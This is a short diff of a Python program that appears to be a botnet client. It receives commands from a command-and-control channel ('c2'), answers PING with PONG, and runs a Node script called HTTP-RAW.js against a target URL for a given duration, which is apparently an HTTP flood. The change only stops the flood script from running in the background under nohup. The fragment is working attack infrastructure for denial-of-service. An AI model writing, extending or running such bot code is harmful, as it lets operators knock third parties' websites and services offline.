@@ -254,7 +254,7 @@ def main():
                     size = 65500
                     threads = 1
                     for _ in range(threads):
-                        os.system(f'nohup node new/HTTP-RAW.js {url} {duration} >/dev/null 2>&1 &')
+                        os.system(f'node new/HTTP-RAW.js {url} {duration}')
                         
                 elif command == 'PING':
                     c2.send('PONG'.encode())
